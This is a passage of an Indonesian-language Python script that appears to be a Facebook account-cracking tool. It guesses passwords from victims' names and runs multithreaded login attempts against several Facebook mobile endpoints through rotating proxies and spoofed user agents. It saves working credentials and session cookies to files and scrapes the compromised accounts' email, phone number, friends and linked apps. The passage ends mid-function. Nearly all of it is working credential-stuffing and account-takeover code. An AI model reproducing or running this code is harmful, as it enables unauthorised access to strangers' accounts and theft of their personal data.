	sol().print(mark(guw, style='red'))
	osk = input(x+'['+p+'f'+x+'] pilih : ')
	if osk in ['y','Y']:
		oprek.append('ya')
	else:
		oprek.append('no')

	guw = '# MENAMPILKAN HASIL CEKPOIN ? (y/t)'
	sol().print(mark(guw, style='green'))
	cpres = input(x+'['+p+'f'+x+'] pilih : ')
	if cpres in ['y','Y']:
		princp.append('ya')
	else:
		princp.append('no')
	guw = '# MENAMBAHKAN SANDI TAMBAHAN ? (y/t)'
	sol().print(mark(guw, style='yellow'))
	pwplus=input(x+'['+p+'f'+x+'] pilih : ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		krek = '[•] USE COMMA AS SEPARATE\n[•] USE LOWER LETTERS\n[•] EXAMPLE: indonesia,germany,bangladesh'
		cetak(nel(krek, title=' • ADDITIONAL PASSWORD • '))
		pwku=input('ENTER ADDITIONAL PASSWORD : ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
	passwrd()

# WORDLIST
def passwrd():
	ler = '# CRACK PROCESS START, PRESS CTRL+Z TO STOP'
	sol().print(mark(ler, style='green'))
	krek = '[•] OK RESULTS SAVED IN : INTERNAL MEMORY/4MBF-DATA/OK/%s\n[•] CP RESULTS SAVED IN : INTERNAL MEMORY/4MBF-DATA/CP/%s\nON OF AIRPLANE MODE EVERY 500 ID'%(okc,cpc)
	cetak(nel(krek, title=' • CRACK • '))
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			try:
				idf,nmf,ttl = yuzong.split('|')[0],yuzong.split('|')[1].lower(),yuzong.split('|')[2].lower()
			except:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass


			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					if 'ya' in pwpluss:
						for xpwd in pwnya:
							pwv.append(xpwd)
			if 'mobile' in method:
				pool.submit(crack,idf,pwv,nmf)
			elif 'free' in method:
				pool.submit(crackfree,idf,pwv)
			elif 'touch' in method:
				pool.submit(cracktouch,idf,pwv)
			elif 'mbasic' in method:
				pool.submit(crackmbasic,idf,pwv)
			else:
				pool.submit(crackmbasic,idf,pwv)
	print('')
	tanya = '# CRAK SELESAI!!'
	sol().print(mark(tanya, style='red'))
	exit()

# CRACKER
def crack(idf,pwv,nmf):
	global loop,ok,cp
	bi = random.choice([u,k,kk,b,h,hh])
	pers = loop*100/len(id2)
	fff = '%'
	ua = random.choice(ugen)
#	ua='Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-F900U Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/67.0.3396.87 Mobile Safari/537.36'
	ua2 = random.choice(ugen2)
	nip=random.choice(prox)
	ses=requests.Session()
	proxs= {'http': 'socks5://'+nip}
	sys.stdout.write('\r%s [•.•ิ] %s/%s [ CP:%s - OK:%s - %s%s%s ]'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
	for pw in pwv:
		try:
			secua=re.findall(' Chrome/(.*?)Mobile Safari/537.36',str(ua))[0].split('.')[0]
			ses.headers.update({"Host":'free.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://free.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
#			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','upgrade-insecure-requests': '1','user-agent': ua2,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&next=https%3A%2F%2Fm.facebook.com%2Flogin%2Fsave-device%2F%3Flogin_source%3Dlogin%26refsrc%3Ddeprecated%26ref%3Ddbl&flow=login_no_pin&refsrc=deprecated&ref=dbl&_rdr')
			readable = str(time.time()).split('.')[0]
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/login/save-device/?login_source=login&refsrc=deprecated&ref=dbl","flow":"login_no_pin","encpass":f'#PWD_BROWSER:0:{readable}:{pw}'}
#tapyes			ses.headers.update({'Host': 'm.facebook.com','upgrade-insecure-requests': '1','cache-control': 'max-age=0','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&next=https%3A%2F%2Fm.facebook.com%2Flogin%2Fsave-device%2F%3Flogin_source%3Dlogin%26refsrc%3Ddeprecated%26ref%3Ddbl&flow=login_no_pin&refsrc=deprecated&ref=dbl&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'ms-MY,ms;q=0.9,en-US;q=0.8,en;q=0.7'})
			ses.headers.update({'Host': 'm.facebook.com','upgrade-insecure-requests': '1','cache-control': 'max-age=0','sec-ch-ua': f'" Not A;Brand";v="{secua}", "Chromium";v="{secua}"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'none','sec-fetch-mode': 'no-cors','sec-fetch-user': '?1','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&next=https%3A%2F%2Fm.facebook.com%2Flogin%2Fsave-device%2F%3Flogin_source%3Dlogin%26refsrc%3Ddeprecated%26ref%3Ddbl&flow=login_no_pin&refsrc=deprecated&ref=dbl&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'zh-HK,zh;q=0.9,en-US;q=0.8,en;q=0.7'})
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&ref=dbl',data=dataa,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					idfs=idf
					pws=pw
					cp+=1
					try:
						cekopsii(idfs,pws,ttl)
					except:
						cekopsii(idfs,pws)

				elif 'ya' in princp:
					print('\n')
					try:
						statuscp = f'\r[•] ID       : {idf} \n[•] PASSWORD : {pw} \n[•] NAME : {nmf}\n[•] BIRTHDAY : {ttl}'
						open('/sdcard/4MBF-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'|'+ttl+'\n')
					except:
						statuscp = f'\r[•] ID       : {idf} \n[•] PASSWORD : {pw} \n[•] NAME : {nmf}'
						open('/sdcard/4MBF-DATA/OK/'+cpc,'a').write(idf+'|'+pw+'\n')
					statuscp1 = nel(statuscp, style='yellow')
					cetak(nel(statuscp1, title='CHECKPOINT'))
					cp+=1
				else:continue
				break
			elif "c_user" in po.cookies.get_dict().keys():
				headapp={"user-agent":"SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]"}
				if 'no' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('/sdcard/4MBF-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='FIK OK'))
					ok+=1
					break
				elif 'ya' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('/sdcard/4MBF-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					user=idf
					infoakun = ""
					session = requests.Session()
					emhp=requests.get('https://mbasic.facebook.com/profile.php?v=info',cookies=coki,headers=headapp).text
					try:
						email=re.search('target="_blank">(.*?)&#064;(.*?)<',str(emhp)).groups(1)
						infoakun+= (f"[bold green][•] EMAIL : {email[0]}@{email[1]}[/bold green]\n")
					except:
						infoakun+= (f"[bold green][•] EMAIL : - [/bold green]\n")
					try:
						nohp=re.search('>08(.*?)-(.*?)-(.*?)</span>',str(emhp)).groups(1)
						infoakun+= (f"[bold green][•] PHONE NUMBER : 08{nohp[0]}{nohp[1]}{nohp[2]}[/bold green]\n")
					except:
						infoakun+= (f"[bold green][•] PHONE NUMBER : - [/bold green]\n")
					try:
						tems=session.get('https://mbasic.facebook.com/profile.php?id='+idf+'&v=friends',cookies=coki,headers=headapp).text
						teman=re.search('>Teman (.*?)<',str(tems)).groups(1)
						tem=teman[0].split('(')
						temm=tem[1].split(')')
						infoakun+= (f"[bold green][•] FRIEND : {temm[0]}[/bold green]\n")
					except:
						infoakun+= (f"[bold green][•] FRIEND : - [/bold green]\n")
					try:
						tahs=session.get('https://mbasic.facebook.com/'+idf+'/allactivity/?entry_point=settings_yfi&settings_tracking=mbasic_footer_link%3Asettings_2_0&privacy_source=your_facebook_information&_rdr',cookies=coki,headers=headapp).text
						tah=re.findall('id="year_(.*?)"',str(tahs))
						tahu=(len(tah)-1)
						tahun=tah[tahu]
						infoakun+= (f"[bold green][•] YEAR ACCOUNT : {tahun} [/bold green]\n")
					except:
						infoakun+= (f"[bold green][•] YEAR ACCOUNT : -  [/bold green]\n")


					cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
					cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
					infoakun += (f"\n[bold cyan][•] LIST ACTIVE APPLICATIONS :[/bold cyan] \n")
					apkaktif=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek))
					nok=1
					for muncul in apkaktif:
						infoakun+= (f"[bold cyan][{nok}] {muncul[0]} {muncul[1]}[/bold cyan]\n")
						nok+=1

					hit=0
					infoakun += (f"\n[bold yellow][•] LIST EXPIRED APPLICATIONS :[/bold yellow]\n")
					apkexp=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek2))
					hit=0
					for muncul in apkexp:
						hit+=1
						infoakun += (f"[bold yellow][{hit}] {muncul[0]} {muncul[1]}[/bold yellow]\n")
					print('\n')
					statusok = f'[bold green]\r[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}[/bold green]\n{infoakun}'
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='[bold green]SHIN-XZY LIVE[/bold green]'))
					ok+=1
					break


			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1


def crackfree(idf,pwv):
	global loop,ok,cp
	bi = random.choice([u,k,kk,b,h,hh])
	pers = loop*100/len(id2)
	fff = '%'
	nip=random.choice(prox)
	proxs= {'http': 'socks5://'+nip}
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	sys.stdout.write('\r%s SHIN %s/%s [ LIVE:%s - CP:%s - %s%s%s ]'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
	for pw in pwv:
		try:
			ses.headers.update({'Host': 'free.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua2,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://free.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://free.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'free.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://free.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://free.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'ms-MY,ms;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}
			po = ses.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
				elif 'ya' in princp:
					print('\n')
					statuscp = f'[•] ID       : {idf} [•] PASSWORD : {pw}'
					statuscp1 = nel(statuscp, style='red')
					cetak(nel(statuscp1, title='SHIN CP'))
					open('/sdcard/4MBF-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				else:continue
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				headapp={"user-agent":"SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]"}
				if 'no' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('/sdcard/4MBF-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='SHIN LIVE'))
					ok+=1
					break
				elif 'ya' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('/sdcard/4MBF-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					user=idf
					infoakun = ""
					session = requests.Session()
					cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
					cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
					infoakun += (f"\n[bold cyan][•] LIST ACTIVE APPLICATIONS :[/bold cyan] \n")
					apkaktif=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek))
					nok=1
					for muncul in apkaktif:
						infoakun+= (f"[bold cyan][{nok}] {muncul[0]} {muncul[1]}[/bold cyan]\n")
						nok+=1

					hit=0
					infoakun += (f"\n[bold yellow][•] LIST EXPIRED APPLICATIONS :[/bold yellow]\n")
					apkexp=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek2))
					hit=0
					for muncul in apkexp:
						hit+=1
						infoakun += (f"[bold yellow][{hit}] {muncul[0]} {muncul[1]}[/bold yellow]\n")
					print('\n')
					statusok = f'[bold green][•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}[/bold green]\n{infoakun}'
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='[bold green]SHIN LIVE[/bold green]'))
					ok+=1
					break


			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1


def cracktouch(idf,pwv):
	global loop,ok,cp
	bi = random.choice([u,k,kk,b,h,hh])
	pers = loop*100/len(id2)
	fff = '%'
	nip=random.choice(prox)
	proxs= {'http': 'socks5://'+nip}
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	sys.stdout.write('\r%s SHIN %s/%s [ LIVE:%s - CP:%s - %s%s%s ]'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
	for pw in pwv:
		try:
			ses.headers.update({'Host': 'touch.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://touch.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://touch.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'touch.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://touch.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://touch.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'fr_FR,fr;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}
			po = ses.post('https://touch.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
				elif 'ya' in princp:
					print('\n')
					statuscp = f'[•] ID       : {idf} [•] PASSWORD : {pw}'
					statuscp1 = nel(statuscp, style='red')
					cetak(nel(statuscp1, title='SHIN CP'))
					open('/sdcard/4MBF-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				else:continue
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				headapp={"user-agent":"SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]"}
				if 'no' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('/sdcard/4MBF-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='SHIN LIVE'))
					ok+=1
					break
				elif 'ya' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('/sdcard/4MBF-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					user=idf
					infoakun = ""
					session = requests.Session()
					cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
					cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
					infoakun += (f"\n[bold cyan][•] LIST ACTIVE APPLICATIONS :[/bold cyan] \n")
					apkaktif=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek))
					nok=1
					for muncul in apkaktif:
						infoakun+= (f"[bold cyan][{nok}] {muncul[0]} {muncul[1]}[/bold cyan]\n")
						nok+=1

					hit=0
					infoakun += (f"\n[bold yellow][•] LIST EXPIRED APPLICATIONS :[/bold yellow]\n")
					apkexp=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek2))
					hit=0
					for muncul in apkexp:
						hit+=1
						infoakun += (f"[bold yellow][{hit}] {muncul[0]} {muncul[1]}[/bold yellow]\n")
					print('\n')
					statusok = f'[bold green][•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}[/bold green]\n{infoakun}'
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='[bold green]SHIN LIVE[/bold green]'))
					ok+=1
					break


			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
def crackmbasic(idf,pwv):
	global loop,ok,cp
	bi = random.choice([u,k,kk,b,h,hh])
	pers = loop*100/len(id2)
	fff = '%'
	nip=random.choice(prox)
	proxs= {'http': 'socks5://'+nip}
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	sys.stdout.write('\r%s SHIN %s/%s [ LIVE:%s - CP:%s - %s%s%s ]'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
	for pw in pwv:
		try:

			ses.headers.update({'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://mbasic.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'fr_FR,fr;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}
			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
				elif 'ya' in princp:
					print('\n')
					statuscp = f'[•] ID       : {idf} [•] PASSWORD : {pw}'
					statuscp1 = nel(statuscp, style='red')
					cetak(nel(statuscp1, title='SHIN CP'))
					open('/sdcard/4MBF-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				else:continue
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				headapp={"user-agent":"SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]"}
				if 'no' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('/sdcard/4MBF-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='OK'))
					ok+=1
					break
				elif 'ya' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('/sdcard/4MBF-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					user=idf
					infoakun = ""
					session = requests.Session()
					cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
					cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
					infoakun += (f"\n[bold cyan][•] LIST ACTIVE APPLICATIONS :[/bold cyan] \n")
					apkaktif=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek))
					nok=1
					for muncul in apkaktif:
						infoakun+= (f"[bold cyan][{nok}] {muncul[0]} {muncul[1]}[/bold cyan]\n")
						nok+=1

					hit=0
					infoakun += (f"\n[bold yellow][•] LIST EXPIRED APPLICATIONS :[/bold yellow]\n")
					apkexp=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek2))
					hit=0
					for muncul in apkexp:
						hit+=1
						infoakun += (f"[bold yellow][{hit}] {muncul[0]} {muncul[1]}[/bold yellow]\n")
					print('\n')
					statusok = f'[bold green][•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}[/bold green]\n{infoakun}'
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='[bold green]SHIN OK[/bold green]'))
					ok+=1
					break


			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1


# OPSI CEKER
def cek_opsi():
	c = len(akun)
	hu = 'Terdapat %s Akun Untuk Dicek\nSebelum Mulai, Mode Pesawat/Ubah Kartu Sim Terlebih Dahulu'%(c)
	cetak(nel(hu, title='CEK OPSI'))
	input(x+'['+h+'•'+x+'] Mulai')
	cek = '# PROSES CEK OPSI DIMULAI'
	sol().print(mark(cek, style='green'))
	love = 1
	for kes in akun:
			try:
				idfs,pws,ttl= kes.split('|')[0],kes.split('|')[1],kes.split('|')[2]
			except:
				idfs,pws= kes.split('|')[0],kes.split('|')[1]
				continue
			print('\r[C] CHECKING ID [ %s ] [ %s/%s]'%(idfs,love,len(akun)), end=' ');sys.stdout.flush()
			try:
				cekopsii(idfs,pws,ttl)
			except:
				cekopsii(idfs,pws)
			love+=1
	dah = '# DONE'
	sol().print(mark(dah, style='green'))
	exit()
def cekopsii(id,pw,ttl):
		try:
			ua = 'Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-F900U Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/67.0.3396.87 Mobile Safari/537.36'
			req=requests.Session()
